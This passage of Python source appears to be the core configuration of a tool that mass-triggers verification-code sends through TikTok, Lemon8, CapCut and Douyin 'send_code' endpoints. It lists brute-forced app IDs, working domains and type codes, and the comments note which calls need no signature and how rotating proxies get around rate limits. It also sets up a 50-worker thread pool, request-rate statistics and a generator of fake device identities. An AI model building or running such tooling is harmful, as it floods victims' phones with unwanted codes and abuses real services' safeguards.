        "name": "BD 6027 (CONFIRMED)", "aid": 6027, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3634, 3635, 3733],
        "domains": ["verify-sg.tiktokv.com",                # SUCCESS tc=3634
                    "api16-normal-c-useast1a.tiktokv.com",  # SUCCESS tc=3635/3634
                    "api16-normal-v4.tiktokv.com",          # SUCCESS tc=3733
                    "api77-normal-c-alisg.tiktokv.com",     # RL confirmed
                    "lemon8-api.tiktokv.com"],              # RL confirmed
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd4143_s": {
        # Lemon8 v4.0: SUCCESS on tiktokv.us domain
        "name": "BD 4143 (CONFIRMED)", "aid": 4143, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3634, 3532],
        "domains": ["api16-normal-useast5.tiktokv.us",      # SUCCESS tc=3635
                    "api77-normal-c-useast1a.tiktokv.com",  # RL confirmed
                    "lemon8-api.tiktokv.com",               # RL confirmed
                    "api-h2.tiktokv.com"],                  # RL confirmed
        "needs_proxy": True, "web_endpoint": True,
    },
    # ======== END Lemon8 v4.0 SECTION ========
    # ======== Lemon8 Multi-Version APK RE v7.0: NEW Lemon8-DEDICATED CONFIRMED APPS ========
    # 23 SUCCESSes after analyzing 8 Lemon8 versions (v11.8.2 -> v12.5.1)
    "lemon8_2239_dedicated": {
        # Lemon8 v7.0: 4 SUCCESSes on Lemon8-DEDICATED hosts (tiktokv.us + lemon8-app.com)
        "name": "Lemon8 AID 2239 (Dedicated CONFIRMED)", "aid": 2239, "app_name": "musical_ly",
        "package": "com.bd.nproject", "version_code": "120501", "version_name": "12.5.1",
        "channel": "googleplay",
        "type_codes": [3536, 3632, 34, 3132, 3631, 3635],
        "domains": ["lemonapi16-normal-useast8.tiktokv.us",  # SUCCESS tc=34
                    "lemon8-api.tiktokv.com",               # SUCCESS tc=3536, 3632
                    "v.lemon8-app.com",                     # SUCCESS tc=3631
                    "s.lemon8-app.com",                     # SUCCESS tc=3132
                    "lemonapi16-normal-useast5.tiktokv.us"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "lemon8_7743_dedicated": {
        # Lemon8 v7.0: 7 SUCCESSes — strongest combo on Lemon8 hosts
        "name": "Lemon8 AID 7743 (Dedicated CONFIRMED)", "aid": 7743, "app_name": "musical_ly",
        "package": "com.bd.nproject", "version_code": "120501", "version_name": "12.5.1",
        "channel": "googleplay",
        "type_codes": [3731, 3536, 3734, 34],
        "domains": ["lemon8-api.tiktokv.com",               # SUCCESS tc=3536, 3731, 3734
                    "lemonapi16-normal-useast5.tiktokv.us", # SUCCESS tc=34
                    "lemonapi16-normal-useast8.tiktokv.us", # SUCCESS tc=3731
                    "lemonapi16-normal-alisg.tiktokv.com",  # SUCCESS tc=3536
                    "v.lemon8-app.com",                     # SUCCESS tc=3731
                    "api.lemon8-app.com"],                  # SUCCESS tc=34
        "needs_proxy": True, "web_endpoint": True,
        "endpoint_override": "/passport/mobile/send_code/v1/",
    },
    "lemon8_1988_dedicated": {
        # Lemon8 v7.0: 4 SUCCESSes on tiktokv.us hosts (douyin_web app_name)
        "name": "Lemon8 AID 1988 (Dedicated CONFIRMED)", "aid": 1988, "app_name": "douyin_web",
        "package": "com.bd.nproject", "version_code": "120501", "version_name": "12.5.1",
        "channel": "googleplay",
        "type_codes": [34, 3635, 3132],
        "domains": ["lemonapi16-normal-useast8.tiktokv.us", # SUCCESS tc=34, 3132, 3635
                    "lemonapi16-normal-useast5.tiktokv.us"],# SUCCESS tc=34
        "needs_proxy": True, "web_endpoint": True,
    },
    "lemon8_1583_dedicated": {
        # Lemon8 v7.0: SUCCESS on lemonapi16-normal-useast5
        "name": "Lemon8 AID 1583 (Dedicated CONFIRMED)", "aid": 1583, "app_name": "tiktok_web",
        "package": "com.bd.nproject", "version_code": "120501", "version_name": "12.5.1",
        "channel": "googleplay",
        "type_codes": [3635],
        "domains": ["lemonapi16-normal-useast5.tiktokv.us"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "lemon8_1760_dedicated": {
        # Lemon8 v7.0: SUCCESS on lemonapi16-normal-useast8
        "name": "Lemon8 AID 1760 (Dedicated CONFIRMED)", "aid": 1760, "app_name": "musical_ly",
        "package": "com.bd.nproject", "version_code": "120501", "version_name": "12.5.1",
        "channel": "googleplay",
        "type_codes": [3536],
        "domains": ["lemonapi16-normal-useast8.tiktokv.us"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "lemon8_4143_dedicated": {
        # Lemon8 v7.0: SUCCESS on lemonapi16-normal-useast5
        "name": "Lemon8 AID 4143 (Dedicated CONFIRMED)", "aid": 4143, "app_name": "musical_ly",
        "package": "com.bd.nproject", "version_code": "120501", "version_name": "12.5.1",
        "channel": "googleplay",
        "type_codes": [3631],
        "domains": ["lemonapi16-normal-useast5.tiktokv.us"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "lemon8_6849_dedicated": {
        # Lemon8 v7.0: 2 SUCCESSes on lemonapi16-normal-useast5
        "name": "Lemon8 AID 6849 (Dedicated CONFIRMED)", "aid": 6849, "app_name": "musical_ly",
        "package": "com.bd.nproject", "version_code": "120501", "version_name": "12.5.1",
        "channel": "googleplay",
        "type_codes": [3536, 3632],
        "domains": ["lemonapi16-normal-useast5.tiktokv.us"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "lemon8_6027_dedicated": {
        # Lemon8 v7.0: SUCCESS on api.lemon8-app.com
        "name": "Lemon8 AID 6027 (Dedicated CONFIRMED)", "aid": 6027, "app_name": "musical_ly",
        "package": "com.bd.nproject", "version_code": "120501", "version_name": "12.5.1",
        "channel": "googleplay",
        "type_codes": [34],
        "domains": ["api.lemon8-app.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    # ======== END Lemon8 Multi-Version v7.0 SECTION ========
    # ======== CapCut APK RE v5.0: NEW CONFIRMED APPS on CapCut passport hosts ========
    "bd6027_capcut": {
        # CapCut v5.0: 5 SUCCESSes across ALL CapCut passport hosts + inapp.tiktokv.com
        "name": "BD 6027 CapCut (CONFIRMED)", "aid": 6027, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3634, 3733],
        "domains": ["passport-api.capcut.com",                # SUCCESS tc=3635
                    "passport-api.capcutapi.com",             # SUCCESS tc=3733/3635
                    "passport-api-va-us-looki.capcutapi.com", # SUCCESS tc=3635/3733
                    "tt-passport16-normal-sg.capcutapi.com",  # SUCCESS tc=3635
                    "inapp.tiktokv.com"],                     # SUCCESS tc=3634
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd1583_capcut": {
        # CapCut v5.0: SUCCESS on passport-api.capcut.com + passport-api.capcutapi.com
        "name": "TikTok Ads CapCut (CONFIRMED)", "aid": 1583, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3532, 3733],
        "domains": ["passport-api.capcut.com",                # SUCCESS tc=3635
                    "passport-api.capcutapi.com",             # SUCCESS tc=3635
                    "www.tiktok.com", "us.tiktok.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd2239_capcut": {
        # CapCut v5.0: SUCCESS on passport-api.capcut.com + passport-api-v2-boot + api-boot
        "name": "BD 2239 CapCut (CONFIRMED)", "aid": 2239, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3734, 3635, 3634],
        "domains": ["passport-api.capcut.com",                # SUCCESS tc=3734
                    "passport-api-v2-boot.capcutapi.com",     # SUCCESS tc=3734/3635
                    "api-boot.tiktokv.com"],                  # SUCCESS tc=3635
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd1760_capcut": {
        # CapCut v5.0: SUCCESS on tt-passport16 + passport-api.capcut.com
        "name": "BD 1760 CapCut (CONFIRMED)", "aid": 1760, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3634, 3734],
        "domains": ["tt-passport16-normal-sg.capcutapi.com",  # SUCCESS tc=3635
                    "passport-api.capcut.com"],               # SUCCESS tc=3635
        "needs_proxy": True, "web_endpoint": True,
    },
    # ======== END CapCut v5.0 SECTION ========
    # ======== TikTok Seller APK RE v6.0: NEW CONFIRMED APPS on Shop + Verification hosts ========
    "bd7743_shop": {
        # Seller v6.0: 7 domains SUCCESS — tiktokglobalshopv.com/us, verification, rc-verification, web-va, ads
        "name": "BD 7743 Shop (CONFIRMED)", "aid": 7743, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3532, 3734, 3635],
        "domains": ["api.tiktokglobalshopv.com",                    # SUCCESS tc=3532/3734
                    "api.tiktokglobalshopv.us",                     # SUCCESS tc=3532/3734
                    "verification-va.tiktokv.com",                  # SUCCESS tc=3734/3532
                    "rc-verification16-normal-useast5.tiktokv.us",  # SUCCESS tc=3532
                    "rc-verification-sg.tiktokv.com",               # SUCCESS tc=3734
                    "web-va.tiktok.com",                            # SUCCESS tc=3734
                    "ads.tiktok.com"],                              # SUCCESS tc=3532
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd2239_shop": {
        # Seller v6.0: 5 domains SUCCESS — verification, rc-verification, tiktokglobalshopv, ads
        "name": "BD 2239 Shop (CONFIRMED)", "aid": 2239, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3634, 3734],
        "domains": ["api.tiktokglobalshopv.com",                    # SUCCESS tc=3635
                    "verification-va.tiktokv.com",                  # SUCCESS tc=3635
                    "rc-verification-va.tiktokv.com",               # SUCCESS tc=3635
                    "rc-verification-sg.tiktokv.com",               # SUCCESS tc=3635
                    "ads.tiktok.com"],                              # SUCCESS tc=3635/3634
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd6027_shop": {
        # Seller v6.0: 5 domains SUCCESS — rc-verification, verification, eu.tiktokglobalshopv
        "name": "BD 6027 Shop (CONFIRMED)", "aid": 6027, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3733, 3734],
        "domains": ["rc-verification-va.tiktokv.com",               # SUCCESS tc=3635
                    "rc-verification-i18n.tiktokv.com",             # SUCCESS tc=3635
                    "rc-verification-sg.tiktokv.com",               # SUCCESS tc=3733
                    "verification-va.tiktokv.com",                  # SUCCESS tc=3635
                    "api.eu.tiktokglobalshopv.com"],                # SUCCESS tc=3635/3734
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd6849_shop": {
        # Seller v6.0: SUCCESS on tiktokglobalshopv.us + rc-verification16
        "name": "BD 6849 Shop (CONFIRMED)", "aid": 6849, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3734, 3733],
        "domains": ["api.tiktokglobalshopv.us",                     # SUCCESS tc=3635/3734/3733
                    "rc-verification16-normal-useast5.tiktokv.us"],  # SUCCESS tc=3635
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd1760_shop": {
        # Seller v6.0: SUCCESS on verification16 + rc-verification16 + tiktokglobalshopv.us
        "name": "BD 1760 Shop (CONFIRMED)", "aid": 1760, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3734, 3733],
        "domains": ["verification16-normal-useast5.tiktokv.us",     # SUCCESS tc=3635
                    "rc-verification16-normal-useast5.tiktokv.us",  # SUCCESS tc=3635/3734
                    "api.tiktokglobalshopv.us"],                    # SUCCESS tc=3733
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd4143_shop": {
        # Seller v6.0: SUCCESS on rc-verification16-normal-useast5.tiktokv.us
        "name": "BD 4143 Shop (CONFIRMED)", "aid": 4143, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3734],
        "domains": ["rc-verification16-normal-useast5.tiktokv.us"],  # SUCCESS tc=3635/3734
        "needs_proxy": True, "web_endpoint": True,
    },
    # ======== END TikTok Seller v6.0 SECTION ========
}

BYTEDANCE_APPS = {
    "douyin": {
        # CONFIRMED SUCCESS: amemv + 8 snssdk.com + verify.zijieapi.com
        "name": "Douyin (Chinese TikTok)", "aid": 1128, "app_name": "aweme",
        "package": "com.ss.android.ugc.aweme", "version_code": "290100", "version_name": "29.1.0",
        "channel": "update", "type_codes": [3532, 3635, 3637, 3634],
        "domains": CHINESE_APP_DOMAINS,
    },
    "douyin_lite": {
        "name": "Douyin Lite", "aid": 2329, "app_name": "aweme_lite",
        "package": "com.ss.android.ugc.aweme.lite", "version_code": "290100", "version_name": "29.1.0",
        "channel": "update", "type_codes": [3532, 3635, 3637, 3634],
        "domains": CHINESE_APP_DOMAINS,
    },
    "douyin_huoshan": {
        # CONFIRMED SUCCESS: api5-normal-c-lf.amemv.com tc=3635 region=DE
        "name": "Douyin Huoshan", "aid": 1112, "app_name": "live_stream",
        "package": "com.ss.android.ugc.live", "version_code": "110300", "version_name": "11.3.0",
        "channel": "update", "type_codes": [3532, 3635, 3637, 3634],
        "domains": CHINESE_APP_DOMAINS,
    },
    "pipix": {
        # CONFIRMED SUCCESS: pipix.com + snssdk.com domains
        "name": "Pipix / SuperB", "aid": 1319, "app_name": "super",
        "package": "com.sup.android.superb", "version_code": "620", "version_name": "6.2.0",
        "channel": "update", "type_codes": [3532, 3635, 3637, 3634],
        "domains": ["api5.pipix.com", "api3.pipix.com"] + CHINESE_APP_DOMAINS,
    },
    "toutiao": {
        # CONFIRMED SUCCESS: verify.zijieapi.com tc=3635 SG
        "name": "Toutiao (Headlines)", "aid": 13, "app_name": "news_article",
        "package": "com.ss.android.article.news", "version_code": "9500", "version_name": "9.5.0",
        "channel": "update", "type_codes": [3532, 3635, 3637, 3634],
        "domains": CHINESE_APP_DOMAINS,
    },
    "xigua": {
        # CONFIRMED SUCCESS: api3-normal-c-lf.amemv.com tc=3635 region=AU
        "name": "Xigua Video", "aid": 32, "app_name": "video_article",
        "package": "com.ss.android.article.video", "version_code": "7500", "version_name": "7.5.0",
        "channel": "update", "type_codes": [3532, 3635, 3637, 3634],
        "domains": CHINESE_APP_DOMAINS,
    },
    "helo": {
        # Confirmed by user's 8676-request scan: Helo aid=1180 with app_name "musical_ly"
        # works across multiple tiktokv.com domains with type codes 3631/3632/3634/3637/3733/3734
        "name": "Helo", "aid": 1180, "app_name": "musical_ly",
        "package": "com.ss.android.ugc.helo", "version_code": "4500", "version_name": "4.5.0",
        "channel": "googleplay",
        "type_codes": [3631, 3632, 3634, 3637, 3733, 3734, 3635, 3132, 3536, 3730, 3731],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "tiktok": {
        # Confirmed SUCCESS on 15+ domains and 6 type codes across 8676-request scan
        "name": "TikTok Global", "aid": 1233, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3733, 3631, 3632, 3634, 3637, 3734, 3635, 3132, 3536, 3730, 3731, 34],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "tiktok_lite": {
        # Confirmed SUCCESS - app_name is "trill" not "tiktok_lite"!
        "name": "TikTok Lite", "aid": 1340, "app_name": "trill",
        "package": "com.zhiliaoapp.musically.go", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3132, 3631, 3632, 3634, 3637, 3733, 3734, 3530, 3635, 3536, 3730, 3731, 3532, 34],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "capcut": {
        # Confirmed SUCCESS on 4 domains with 12 working type codes
        "name": "CapCut", "aid": 3006, "app_name": "vicut",
        "package": "com.lemon.lvoverseas", "version_code": "9200400", "version_name": "9.2.0",
        "channel": "googleplay",
        "type_codes": [3731, 3631, 3132, 3634, 3733, 34, 3536, 3637, 3532, 3632, 3730, 3734],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    # ======== WEB-BASED APPS (NO SIGNING NEEDED) ========
    "tiktok_web": {
        # AID=1459 on /passport/web/send_code/ — NO signatures, NO device registration!
        "name": "TikTok Web (No-Sign)", "aid": 1459, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3532, 3635, 3733, 3631, 3637, 3634, 3734, 3132],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True,
        "web_endpoint": True,
    },
    "douyin_web": {
        # CONFIRMED SUCCESS: us.tiktok.com tc=3635 region=DE (mega test)
        # AID=1988 on /passport/web/send_code/ — NO signing needed!
        "name": "Douyin Web (No-Sign)", "aid": 1988, "app_name": "douyin_web",
        "package": "douyin_web", "version_code": "1", "version_name": "1.0",
        "channel": "douyin_web",
        "type_codes": [3532, 3635, 3733, 3631, 3637, 3634, 3734, 3132, 3536],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True,
        "web_endpoint": True,
    },
    "tiktok_unsigned": {
        # Mobile endpoint on tiktokv.com WITHOUT signatures — rate-limited = works
        "name": "TikTok Unsigned (No-Sign)", "aid": 1233, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3733, 3631, 3632, 3634, 3637, 3734],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "needs_proxy": True,
        "unsigned_mobile": True,
    },
    # ======== BRUTE FORCE DISCOVERED APPS (AID 1-10000 scan, web endpoint) ========
    "tiktok_ads_web": {
        # CONFIRMED SUCCESS: www.tiktok.com tc=3635 SG, us.tiktok.com tc=3635 DE/SG,
        # www.capcut.com tc=3635 AU, www.tiktok.com tc=3532 AU/SG, us.tiktok.com tc=3532 AU/SG
        # Works best with non-US regions: AU, SG, DE
        "name": "TikTok Ads (No-Sign)", "aid": 1583, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3532, 3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_1760": {
        "name": "ByteDance 1760 (No-Sign)", "aid": 1760, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_2960": {
        "name": "ByteDance 2960 (No-Sign)", "aid": 2960, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_4068": {
        "name": "ByteDance 4068 (No-Sign)", "aid": 4068, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_4143": {
        "name": "ByteDance 4143 (No-Sign)", "aid": 4143, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_4174": {
        "name": "ByteDance 4174 (No-Sign)", "aid": 4174, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_5049": {
        "name": "ByteDance 5049 (No-Sign)", "aid": 5049, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_6027": {
        "name": "ByteDance 6027 (No-Sign)", "aid": 6027, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_6556": {
        "name": "ByteDance 6556 (No-Sign)", "aid": 6556, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_6849": {
        "name": "ByteDance 6849 (No-Sign)", "aid": 6849, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_8311": {
        "name": "ByteDance 8311 (No-Sign)", "aid": 8311, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    # ======== MEGA FUZZER DISCOVERED (Phase 3 — AID 1-10000 brute force) ========
    "bd_2239": {
        # CONFIRMED SUCCESS: tiktok.com/capcut.com web endpoint — NEW AID!
        # Note: www.tiktok.com sometimes returns HTML with tc=3532 — tc=3635 is most reliable
        "name": "ByteDance 2239 (No-Sign)", "aid": 2239, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3532, 3637, 3634],
        "domains": ["us.tiktok.com", "www.capcut.com", "www.tiktok.com", "shop.tiktok.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_259": {
        # Rate-limited on signed mobile (=works with fresh IP) — NEW AID!
        "name": "ByteDance 259 (Signed)", "aid": 259, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3532, 3637, 3634],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    # ======== ULTRA BRUTE FORCE v2.0 DISCOVERED (AID 1-100000, 4 phases, ~204K tests) ========
    "bd_2657": {
        # NEW! Rate-limited on api-h2.tiktokv.com tc=3731 (Ultra Brute Phase 3)
        # Verified rate-limited on multiple domains + type codes in Phase 4
        "name": "ByteDance 2657 (Signed)", "aid": 2657, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3731, 3635, 3637, 3631, 3532, 34],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    # ======== VOLCENGINE AIDs (ec=16 on all endpoints, rate-limited on /passport/open/send_code/) ========
    "volcengine_3569": {
        # ec=16 on mobile/web endpoints, rate-limited on /passport/open/send_code/ = valid AID
        "name": "Volcengine 3569", "aid": 3569, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3532, 3637, 3634],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "volcengine_3559": {
        # ec=16 on mobile/web endpoints, rate-limited on /passport/open/send_code/ = valid AID
        "name": "Volcengine 3559", "aid": 3559, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3532, 3637, 3634],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    # ======== SIGNED BRUTE FORCE DISCOVERED (AID 1-10000 on tiktokv.com) ========
    "bd_2658": {
        # CONFIRMED SUCCESS via signed mobile endpoint on tiktokv.com (Lemon8 / likely)
        # Signature accepted on: all 16 tiktokv + musical.ly legacy + api22 + api-h2 + lemon8 + web domains
        "name": "ByteDance 2658 (Lemon8)", "aid": 2658, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3637, 3634, 3631, 3733, 3734, 3132, 3536, 3730, 3731, 3532, 34],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "bd_7743": {
        # CONFIRMED SUCCESS: api16-normal-v4 tc=3635 AU, api16-normal-useast5 tc=3635 DE
        "name": "ByteDance 7743 (Signed)", "aid": 7743, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3637, 3634, 3631, 3733, 3734, 3132, 3536, 3730, 3731],
        "domains": TIKTOKV_MOBILE_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
}

DEFAULT_APP = "pipix"

# Thread pool for blocking operations
thread_pool = ThreadPoolExecutor(max_workers=50)

# Global stats
class GlobalStats:
    def __init__(self):
        self.total_requests = 0
        self.total_success = 0
        self.total_failed = 0
        self.start_time = time.time()
        self._lock = asyncio.Lock()
    
    async def increment(self, success: bool):
        async with self._lock:
            self.total_requests += 1
            if success:
                self.total_success += 1
            else:
                self.total_failed += 1
    
    def get_stats(self) -> Dict:
        uptime = time.time() - self.start_time
        return {
            "total_requests": self.total_requests,
            "total_success": self.total_success,
            "total_failed": self.total_failed,
            "uptime_seconds": uptime,
            "requests_per_minute": (self.total_requests / uptime * 60) if uptime > 0 else 0
        }

global_stats = GlobalStats()

# ============================================
# DEVICE IDENTITY GENERATOR WITH REGISTRATION
# ============================================

class DeviceIdentityGenerator:
    """Device Identity Generator with ByteDance device registration for valid IDs"""

    DEVICE_BRANDS = {
        "Samsung": ["SM-G991B", "SM-G996B", "SM-G998B", "SM-A525F", "SM-A725F", "SM-N986B", "SM-F926B", "SM-S901B", "SM-S906B", "SM-S908B", "SM-A536B", "SM-A346B", "SM-M536B", "SM-G781B"],
        "Xiaomi": ["M2101K6G", "M2102J20SG", "M2011K2G", "M2012K11AG", "22041219G", "22071219CG", "23049PCD8G", "2201116SG", "2203121C", "22101316G"],
        "OnePlus": ["LE2111", "LE2115", "LE2121", "LE2125", "NE2213", "CPH2449", "PHB110", "CPH2487", "NE2210", "LE2101"],
        "OPPO": ["CPH2145", "CPH2207", "CPH2247", "CPH2305", "CPH2371", "CPH2387", "CPH2451", "CPH2473", "CPH2493", "CPH2525"],
        "Vivo": ["V2111", "V2130", "V2145", "V2154", "V2185", "V2203", "V2217", "V2227", "V2241", "V2254"],
        "Realme": ["RMX3085", "RMX3161", "RMX3195", "RMX3241", "RMX3286", "RMX3370", "RMX3393", "RMX3474", "RMX3521", "RMX3630"],
        "Huawei": ["ELS-NX9", "NOH-NX9", "JAD-LX9", "OCE-AN10", "ANA-NX9", "LIO-N29", "TET-AN00", "ABR-AL80", "DCO-AL00", "NAM-AL00"],
        "Google": ["Pixel 6", "Pixel 6 Pro", "Pixel 7", "Pixel 7 Pro", "Pixel 8", "Pixel 8 Pro", "Pixel 6a", "Pixel 7a", "Pixel 8a", "Pixel Fold"],
        "Motorola": ["XT2175-2", "XT2201-2", "XT2225-1", "XT2237-2", "XT2251-1", "XT2301-4", "XT2343-1", "XT2361-3", "XT2381-3", "XT2401-3"],
        "Itel": ["itel S685LN", "itel A665L", "itel P55", "itel S23", "itel A70", "itel P40", "itel S18", "itel A60", "itel P65", "itel S24"],
        "Infinix": ["X6831", "X6711", "X6871", "X6833B", "X6739", "X6710", "X6837", "X6525", "X6528", "X6826"],
